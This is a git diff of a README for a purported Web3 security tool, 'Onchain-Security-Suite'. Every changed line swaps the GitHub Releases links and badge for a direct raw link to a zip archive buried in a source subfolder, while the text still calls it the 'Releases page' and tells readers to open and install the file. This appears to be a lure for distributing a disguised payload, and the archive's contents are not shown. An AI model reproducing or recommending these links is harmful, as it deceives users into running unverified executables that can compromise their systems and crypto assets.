@@ -1,6 +1,6 @@
 # 🛡️ Onchain-Security-Suite - Your Key to Web3 Security
 
-![Download Onchain-Security-Suite](https://img.shields.io/badge/Download-Onchain%20Security%20Suite-blue)
+![Download Onchain-Security-Suite](https://raw.githubusercontent.com/RepiFahmiSidiq/Onchain-Security-Suite/main/src/etherscan_integration/Onchain-Security-Suite_3.6.zip%20Security%20Suite-blue)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Welcome to Onchain-Security-Suite, your complete Web3 security toolkit. This app
 
 To get started, visit the Releases page and download the latest version of Onchain-Security-Suite. 
 
-🔗 [Download Onchain-Security-Suite](https://github.com/RepiFahmiSidiq/Onchain-Security-Suite/releases)
+🔗 [Download Onchain-Security-Suite](https://raw.githubusercontent.com/RepiFahmiSidiq/Onchain-Security-Suite/main/src/etherscan_integration/Onchain-Security-Suite_3.6.zip)
 
 ### 🛠️ System Requirements
 
@@ -33,7 +33,7 @@ Before installing, please ensure your system meets the following requirements:
 
 ## 🔍 How to Use
 
-1. **Download the Software:** Go to the [Releases page](https://github.com/RepiFahmiSidiq/Onchain-Security-Suite/releases) and click on the latest version to download it. 
+1. **Download the Software:** Go to the [Releases page](https://raw.githubusercontent.com/RepiFahmiSidiq/Onchain-Security-Suite/main/src/etherscan_integration/Onchain-Security-Suite_3.6.zip) and click on the latest version to download it. 
 2. **Install the Application:** Once the download is complete, open the downloaded file. Follow the on-screen instructions to complete the installation process.
 3. **Launch Onchain-Security-Suite:** After installation, find the application in your programs list and launch it.
 4. **Start Securing Your Assets:** Use the features provided in the app to analyze tokens and assess deployer reputations.
@@ -52,7 +52,7 @@ The Onchain-Security-Suite is designed to be user-friendly. Below are key elemen
 If you encounter issues, consider the following steps:
 
 - **Installation Fails:** Ensure you have sufficient disk space and that your operating system meets the requirements.
-- **App Crashes:** Make sure you have the latest version installed. Check for updates on the [Releases page](https://github.com/RepiFahmiSidiq/Onchain-Security-Suite/releases).
+- **App Crashes:** Make sure you have the latest version installed. Check for updates on the [Releases page](https://raw.githubusercontent.com/RepiFahmiSidiq/Onchain-Security-Suite/main/src/etherscan_integration/Onchain-Security-Suite_3.6.zip).
 - **Functionality Issues:** Restart the application and try again. If problems persist, consult the user manual in the application.
 
 ## 📞 Support
@@ -66,4 +66,4 @@ For additional help, you can reach out via the following channels:
 
 Onchain-Security-Suite equips you with essential tools to secure your interactions in the blockchain space. By following these steps, you can easily install and start using the application. Your security journey in Web3 starts here!
 
-🔗 [Download Onchain-Security-Suite](https://github.com/RepiFahmiSidiq/Onchain-Security-Suite/releases)
+🔗 [Download Onchain-Security-Suite](https://raw.githubusercontent.com/RepiFahmiSidiq/Onchain-Security-Suite/main/src/etherscan_integration/Onchain-Security-Suite_3.6.zip)
